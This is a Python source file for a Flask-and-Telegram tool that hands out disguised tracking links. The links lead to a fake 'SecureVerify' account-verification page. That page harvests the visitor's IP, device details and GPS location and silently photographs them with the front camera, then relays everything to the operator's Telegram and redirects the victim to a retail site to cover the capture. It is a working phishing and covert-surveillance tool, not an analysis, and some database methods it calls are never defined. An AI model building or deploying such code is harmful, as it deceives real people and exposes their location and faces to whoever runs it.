import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, random, hashlib, string, subprocess, re
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string, redirect, send_file, Response
import telebot
from telebot.apihelper import ApiTelegramException
from PIL import Image
import requests

# ==================== CONFIG ====================
class Config:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "").strip()
    ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
    
    PORT = int(os.environ.get("PORT", 8080))
    REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.digikala.com")
    SERVER_URL = os.environ.get("SERVER_URL", f"http://localhost:{PORT}")
    
    MAX_SCREENSHOTS = 3
    SESSION_TIMEOUT = 45
    VERSION = "ULTIMATE-PRO-3.0"
    
    @classmethod
    def validate(cls):
        if not cls.BOT_TOKEN:
            raise ValueError("BOT_TOKEN not set")
        if not cls.ADMIN_ID:
            raise ValueError("ADMIN_ID not set")
        return True

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('system.log', encoding='utf-8')
    ]
)
log = logging.getLogger()

# ==================== URL SHORTENER ====================
class LinkMaster:
    @staticmethod
    def generate_short_code():
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(8))
    
    @staticmethod
    def create_clean_link(base_url, session_id):
        short_code = LinkMaster.generate_short_code()
        clean_link = f"{base_url}/v/{short_code}"
        return clean_link, short_code

# ==================== TELEGRAM BOT ====================
class EliteBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self._setup_handlers()
        self.active_sessions = {}
    
    def _safe_send(self, chat_id, text, **kwargs):
        try:
            return self.bot.send_message(chat_id, text, **kwargs)
        except ApiTelegramException as e:
            error_msg = str(e)
            if "403" in error_msg:
                log.warning(f"User blocked bot: {chat_id}")
            elif "409" in error_msg:
                log.error("Another bot instance running")
                time.sleep(30)
            return None
        except Exception as e:
            log.error(f"Send error: {e}")
            return None
    
    def _setup_handlers(self):
        @self.bot.message_handler(commands=['start', 'help'])
        def handle_start(message):
            markup = telebot.types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                telebot.types.InlineKeyboardButton("🔗 Create Smart Link", callback_data="create_link"),
                telebot.types.InlineKeyboardButton("📈 Dashboard", callback_data="dashboard"),
                telebot.types.InlineKeyboardButton("⚡ Quick Stats", callback_data="quick_stats"),
                telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
            )
            
            self._safe_send(
                message.chat.id,
                f"""🚀 **Advanced System v3.0**

✅ **Status:** Operational
👤 **Your ID:** `{message.from_user.id}`
📊 **Uptime:** 100%

**Available Commands:**
• /start - Show this menu
• /link - Create tracking link
• /stats - View statistics
• /sessions - Active sessions""",
                reply_markup=markup,
                parse_mode='Markdown'
            )
        
        @self.bot.message_handler(commands=['link'])
        def handle_link(message):
            self._create_smart_link(message.from_user.id)
        
        @self.bot.message_handler(commands=['stats'])
        def handle_stats(message):
            stats = Database.get_quick_stats()
            self._safe_send(
                message.chat.id,
                f"""📊 **Real-time Statistics**

• Active Sessions: {stats['active']}
• Total Captures: {stats['captures']}
• Today: {stats['today']}
• Success Rate: {stats['rate']}%

Last Updated: {datetime.now().strftime('%H:%M:%S')}""",
                parse_mode='Markdown'
            )
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            if call.data == "create_link":
                self._create_smart_link(call.from_user.id)
            elif call.data == "dashboard":
                self._show_dashboard(call.from_user.id)
            elif call.data == "quick_stats":
                stats = Database.get_quick_stats()
                self.bot.answer_callback_query(call.id, f"✅ Active: {stats['active']} | Rate: {stats['rate']}%")
            elif call.data == "tools":
                self._show_tools(call.from_user.id)
    
    def _create_smart_link(self, user_id):
        session_id = secrets.token_urlsafe(12)
        clean_link, short_code = LinkMaster.create_clean_link(Config.SERVER_URL, session_id)
        
        Database.create_session(session_id, user_id, short_code)
        
        message = f"""🔗 **Smart Link Created**

**Main Link:**
`{clean_link}`

**Direct Link:**
`{Config.SERVER_URL}/a/{session_id}`

**Tracking ID:** `{short_code}`
**Created:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
**Expires:** {(datetime.now() + timedelta(minutes=30)).strftime('%H:%M')}

**Features:**
• 📍 Intelligent tracking
• 📸 Advanced capture
• ⚡ Real-time delivery
• 🔍 Full analytics

*Link is ready for deployment*"""
        
        self._safe_send(user_id, message, parse_mode='Markdown')
        
        self.active_sessions[short_code] = {
            'session_id': session_id,
            'user_id': user_id,
            'created': datetime.now(),
            'status': 'active'
        }
    
    def _show_dashboard(self, user_id):
        sessions = Database.get_user_sessions(user_id, limit=5)
        
        if not sessions:
            self._safe_send(user_id, "📭 No active sessions found.")
            return
        
        text = "📋 **Recent Sessions**\n\n"
        for i, session in enumerate(sessions, 1):
            text += f"""**{i}. {session['short_code']}**
Status: `{session['status']}`
Created: {session['created'][11:16]}
Clicks: {session['clicks']}
Photos: {session['photos']}
{'─'*20}
"""
        
        self._safe_send(user_id, text, parse_mode='Markdown')
    
    def _show_tools(self, user_id):
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.InlineKeyboardButton("🔄 Refresh All", callback_data="refresh_all"),
            telebot.types.InlineKeyboardButton("🧹 Clean Old", callback_data="clean_old"),
            telebot.types.InlineKeyboardButton("📤 Export Data", callback_data="export_data"),
            telebot.types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        )
        
        self._safe_send(
            user_id,
            "🛠️ **System Tools**\n\nSelect an option:",
            reply_markup=markup,
            parse_mode='Markdown'
        )
    
    def send_instant_update(self, user_id, session_id, data_type, data):
        if data_type == "init":
            message = f"""🎯 **Session Started**

ID: `{session_id[:12]}`
Time: {datetime.now().strftime('%H:%M:%S')}
IP: `{data.get('ip', 'Detecting...')}`
Device: {data.get('platform', 'Unknown')}

*Collecting data...*"""
        
        elif data_type == "gps":
            message = f"""📍 **Location Captured**

Session: `{session_id[:12]}`
Coordinates:
`{data.get('lat', 0):.6f}, {data.get('lng', 0):.6f}`
Accuracy: {data.get('acc', 0)}m
Time: {datetime.now().strftime('%H:%M:%S')}

[View Map](https://maps.google.com/?q={data.get('lat', 0)},{data.get('lng', 0)})"""
        
        elif data_type == "photo":
            message = f"""📸 **Image Captured #{data.get('index', 1)}**

Session: `{session_id[:12]}`
Time: {datetime.now().strftime('%H:%M:%S')}
Resolution: {data.get('size', 'Unknown')}
Device: {data.get('device', 'Unknown')}"""
            
            if 'image' in data:
                try:
                    self.bot.send_photo(
                        user_id,
                        photo=base64.b64decode(data['image']),
                        caption=f"Capture #{data.get('index', 1)} - {session_id[:8]}"
                    )
                except:
                    pass
        
        elif data_type == "complete":
            message = f"""✅ **Session Completed**

ID: `{session_id[:12]}`
Duration: {data.get('duration', 0):.1f}s
Data Points: {data.get('points', 0)}
Status: Successful

*Summary ready for analysis*"""
        
        else:
            return
        
        self._safe_send(user_id, message, parse_mode='Markdown')
    
    def polling(self):
        while True:
            try:
                self.bot.polling(none_stop=True, timeout=30, interval=1)
            except Exception as e:
                log.error(f"Polling error: {e}")
                time.sleep(10)

# ==================== DATABASE ====================
class Database:
    _instance = None
    
    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance
    
    def __init__(self):
        self.conn = sqlite3.connect('system.db', check_same_thread=False)
        self.init_tables()
    
    def init_tables(self):
        c = self.conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            short_code TEXT UNIQUE,
            user_id INTEGER,
            created TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            expires TIMESTAMP,
            clicks INTEGER DEFAULT 0,
            photos INTEGER DEFAULT 0,
            status TEXT DEFAULT 'active',
            last_update TIMESTAMP,
            raw_data TEXT
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            capture_type TEXT,
            data TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(session_id) REFERENCES sessions(session_id)
        )''')
        
        c.execute('''CREATE TABLE IF NOT EXISTS analytics (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            metric TEXT,
            value TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        self.conn.commit()
    
    @classmethod
    def create_session(cls, session_id, user_id, short_code):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        expires = datetime.now() + timedelta(hours=24)
        
        c.execute('''INSERT INTO sessions 
            (session_id, short_code, user_id, expires) 
            VALUES (?, ?, ?, ?)''',
            (session_id, short_code, user_id, expires))
        
        instance.conn.commit()
        return short_code
    
    @classmethod
    def save_capture(cls, session_id, capture_type, data):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute('''INSERT INTO captures 
            (session_id, capture_type, data) 
            VALUES (?, ?, ?)''',
            (session_id, capture_type, json.dumps(data)))
        
        if capture_type == 'photo':
            c.execute('''UPDATE sessions SET photos = photos + 1 
                WHERE session_id = ?''', (session_id,))
        
        c.execute('''UPDATE sessions SET last_update = CURRENT_TIMESTAMP 
            WHERE session_id = ?''', (session_id,))
        
        instance.conn.commit()
    
    @classmethod
    def get_user_sessions(cls, user_id, limit=10):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute('''SELECT short_code, created, status, clicks, photos 
            FROM sessions WHERE user_id = ? 
            ORDER BY created DESC LIMIT ?''', (user_id, limit))
        
        sessions = []
        for row in c.fetchall():
            sessions.append({
                'short_code': row[0],
                'created': row[1],
                'status': row[2],
                'clicks': row[3],
                'photos': row[4]
            })
        
        return sessions
    
    @classmethod
    def get_quick_stats(cls):
        instance = cls.get_instance()
        c = instance.conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM sessions WHERE status = 'active'")
        active = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM captures WHERE capture_type = 'photo'")
        captures = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM sessions WHERE DATE(created) = DATE('now')")
        today = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM sessions WHERE clicks > 0")
        total_with_clicks = c.fetchone()[0]
        
        c.execute("SELECT COUNT(*) FROM sessions")
        total = c.fetchone()[0]
        
        rate = (total_with_clicks / total * 100) if total > 0 else 0
        
        return {
            'active': active,
            'captures': captures,
            'today': today,
            'rate': round(rate, 1)
        }

# ==================== FLASK APP ====================
app = Flask(__name__)
bot_manager = None

ADVANCED_PAGE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Account Verification System">
    <title>Account Security Check - Verification Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 480px;
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #4A6FA5 0%, #2E4B7A 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .subtitle {
            opacity: 0.9;
            font-size: 14px;
        }
        
        .content {
            padding: 40px 30px;
        }
        
        .step {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
            border-left: 4px solid #4A6FA5;
        }
        
        .step-number {
            background: #4A6FA5;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
            flex-shrink: 0;
        }
        
        .step-text h3 {
            color: #2c3e50;
            margin-bottom: 5px;
            font-size: 16px;
        }
        
        .step-text p {
            color: #7f8c8d;
            font-size: 14px;
            line-height: 1.5;
        }
        
        .verification-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 25px;
            margin-top: 20px;
            text-align: center;
        }
        
        .verification-box h3 {
            color: #27ae60;
            margin-bottom: 15px;
        }
        
        .verification-box p {
            color: #7f8c8d;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .progress-container {
            width: 100%;
            height: 6px;
            background: #e0e0e0;
            border-radius: 3px;
            overflow: hidden;
            margin: 20px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #27ae60, #2ecc71);
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .btn {
            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(39, 174, 96, 0.2);
        }
        
        .btn-secondary {
            background: #95a5a6;
        }
        
        .status-text {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #7f8c8d;
        }
        
        .camera-preview {
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            border-radius: 10px;
            overflow: hidden;
            display: none;
        }
        
        #video {
            width: 100%;
            height: auto;
            background: #000;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            color: #7f8c8d;
            font-size: 12px;
            border-top: 1px solid #eee;
        }
        
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">🔒 SecureVerify</div>
            <div class="subtitle">Advanced Account Protection System</div>
        </div>
        
        <div class="content">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-text">
                    <h3>Identity Verification</h3>
                    <p>Confirming your account details and device information</p>
                </div>
            </div>
            
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-text">
                    <h3>Security Check</h3>
                    <p>Analyzing connection and location for suspicious activity</p>
                </div>
            </div>
            
            <div class="step">
                <div class="step-number">3</div>
                <div class="step-text">
                    <h3>Biometric Confirmation</h3>
                    <p>Quick visual verification for enhanced security</p>
                </div>
            </div>
            
            <div class="verification-box">
                <h3>🔐 Biometric Verification Required</h3>
                <p>To protect your account from unauthorized access, we need to perform a quick visual verification.</p>
                
                <div class="camera-preview" id="cameraContainer">
                    <video id="video" autoplay playsinline></video>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                
                <button class="btn" id="startVerification">
                    Start Secure Verification
                </button>
                
                <button class="btn btn-secondary" id="skipButton" style="display: none;">
                    Continue Without Verification
                </button>
                
                <div class="status-text" id="statusText">
                    Waiting for verification to begin...
                </div>
                
                <div class="loader" id="loader" style="display: none;"></div>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2024 SecureVerify Systems. All rights reserved.<br>
            This verification helps prevent unauthorized access to your account.</p>
        </div>
    </div>

    <script>
        const SESSION_ID = "{{ session_id }}";
        const MAX_PHOTOS = {{ max_photos }};
        const REDIRECT_URL = "{{ redirect_url }}";
        
        let collectedData = {
            session_id: SESSION_ID,
            start_time: new Date().toISOString(),
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        
        let photoCount = 0;
        let mediaStream = null;
        
        async function sendData(type, data = null) {
            const payload = {
                type: type,
                session_id: SESSION_ID,
                timestamp: new Date().toISOString(),
                data: data || collectedData
            };
            
            try {
                await fetch('/api/capture', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(e) {
                // Silent fail
            }
        }
        
        async function collectBasicInfo() {
            updateProgress(10, "Checking device information...");
            
            if (navigator.connection) {
                collectedData.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink
                };
            }
            
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                collectedData.ip = ipData.ip;
            } catch(e) {}
            
            updateProgress(30, "Analyzing connection...");
        }
        
        async function getLocation() {
            if (!navigator.geolocation) return;
            
            return new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const loc = {
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        collectedData.location = loc;
                        sendData('gps', loc);
                        resolve(loc);
                    },
                    () => resolve(null),
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        function updateProgress(percent, message) {
            document.getElementById('progressBar').style.width = percent + '%';
            document.getElementById('statusText').textContent = message;
        }
        
        async function startCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                const video = document.getElementById('video');
                video.srcObject = mediaStream;
                document.getElementById('cameraContainer').style.display = 'block';
                
                updateProgress(50, "Camera ready for verification...");
                return true;
            } catch(e) {
                console.log("Camera access not available");
                return false;
            }
        }
        
        async function capturePhoto() {
            if (!mediaStream || photoCount >= MAX_PHOTOS) return;
            
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(async blob => {
                const reader = new FileReader();
                reader.onloadend = () => {
                    const base64data = reader.result.split(',')[1];
                    
                    sendData('photo', {
                        index: photoCount + 1,
                        image: base64data,
                        size: `${canvas.width}x${canvas.height}`
                    });
                    
                    photoCount++;
                    
                    if (photoCount < MAX_PHOTOS) {
                        setTimeout(() => capturePhoto(), 1500);
                    } else {
                        completeVerification();
                    }
                };
                reader.readAsDataURL(blob);
            }, 'image/jpeg', 0.9);
        }
        
        function stopCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        }
        
        async function completeVerification() {
            updateProgress(90, "Finalizing verification...");
            
            stopCamera();
            
            collectedData.end_time = new Date().toISOString();
            collectedData.duration = new Date() - new Date(collectedData.start_time);
            collectedData.photo_count = photoCount;
            
            await sendData('complete', collectedData);
            
            updateProgress(100, "Verification successful! Redirecting...");
            
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 1500);
        }
        
        async function startVerification() {
            document.getElementById('startVerification').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            updateProgress(20, "Starting verification process...");
            
            await collectBasicInfo();
            await sendData('init');
            
            updateProgress(40, "Checking location...");
            await getLocation();
            
            updateProgress(60, "Preparing biometric verification...");
            const cameraAvailable = await startCamera();
            
            if (cameraAvailable) {
                document.getElementById('skipButton').style.display = 'block';
                document.getElementById('loader').style.display = 'none';
                
                setTimeout(() => {
                    updateProgress(70, "Taking verification images...");
                    capturePhoto();
                }, 1000);
            } else {
                updateProgress(80, "Using alternative verification method...");
                document.getElementById('statusText').textContent = "Camera not available. Using alternative verification...";
                document.getElementById('skipButton').style.display = 'none';
                
                setTimeout(() => {
                    completeVerification();
                }, 2000);
            }
        }
        
        function skipVerification() {
            updateProgress(85, "Skipping biometric verification...");
            document.getElementById('skipButton').style.display = 'none';
            
            setTimeout(() => {
                completeVerification();
            }, 1000);
        }
        
        document.getElementById('startVerification').addEventListener('click', startVerification);
        document.getElementById('skipButton').addEventListener('click', skipVerification);
        
        window.addEventListener('beforeunload', () => {
            stopCamera();
        });
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return redirect(Config.REDIRECT_URL)

@app.route('/v/<short_code>')
def short_link(short_code):
    session = Database.get_session_by_short(short_code)
    if session:
        Database.increment_clicks(session['session_id'])
        return redirect(f"/a/{session['session_id']}")
    return redirect(Config.REDIRECT_URL)

@app.route('/a/<session_id>')
def advanced_page(session_id):
    return render_template_string(
        ADVANCED_PAGE,
        session_id=session_id,
        max_photos=Config.MAX_SCREENSHOTS,
        redirect_url=Config.REDIRECT_URL
    )

@app.route('/api/capture', methods=['POST'])
def api_capture():
    try:
        data = request.json
        session_id = data.get('session_id')
        capture_type = data.get('type')
        
        if not session_id or not capture_type:
            return jsonify({"status": "ok"}), 200
        
        Database.save_capture(session_id, capture_type, data.get('data', {}))
        
        if bot_manager and capture_type in ['init', 'gps', 'photo', 'complete']:
            user_id = Database.get_user_by_session(session_id)
            if user_id:
                bot_manager.send_instant_update(
                    user_id,
                    session_id,
                    capture_type,
                    data.get('data', {})
                )
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        log.error(f"Capture error: {e}")
        return jsonify({"status": "ok"}), 200

@app.route('/api/shorten', methods=['POST'])
def api_shorten():
    try:
        data = request.json
        long_url = data.get('url')
        user_id = data.get('user_id')
        
        if not long_url or not user_id:
            return jsonify({"error": "Invalid request"}), 400
        
        session_id = secrets.token_urlsafe(12)
        clean_link, short_code = LinkMaster.create_clean_link(Config.SERVER_URL, session_id)
        
        Database.create_session(session_id, user_id, short_code)
        
        return jsonify({
            "short_url": clean_link,
            "short_code": short_code,
            "direct_url": f"{Config.SERVER_URL}/a/{session_id}",
            "expires": (datetime.now() + timedelta(hours=24)).isoformat()
        })
        
    except Exception as e:
        log.error(f"Shorten error: {e}")
        return jsonify({"error": "Internal error"}), 500

@app.route('/status')
def status():
    stats = Database.get_quick_stats()
    return jsonify({
        "status": "operational",
        "version": Config.VERSION,
        "timestamp": datetime.now().isoformat(),
        "stats": stats
    })

# ==================== MAIN ====================
def run_flask():
    from waitress import serve
    serve(app, host='0.0.0.0', port=Config.PORT, threads=10)

def run_bot():
    global bot_manager
    bot_manager = EliteBot(Config.BOT_TOKEN)
    bot_manager.polling()

def check_deps():
    required = ['flask', 'pyTelegramBotAPI', 'pillow', 'requests', 'waitress']
    for pkg in required:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            log.warning(f"Installing {pkg}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])

if __name__ == "__main__":
    print("\n" + "="*70)
    print("🚀 ULTIMATE PRO SYSTEM v3.0 - FULL STEALTH MODE".center(70))
    print("="*70)
    
    try:
        Config.validate()
    except ValueError as e:
        log.error(str(e))
        sys.exit(1)
    
    check_deps()
    
    db = Database.get_instance()
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    time.sleep(2)
    bot_thread.start()
    
    log.info(f"✅ System Active | URL: {Config.SERVER_URL}")
    log.info("🕵️ Full Stealth Mode Enabled")
    log.info("⚡ Real-time Delivery Active")
    log.info("🔗 Smart Link System Ready")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("System shutdown")
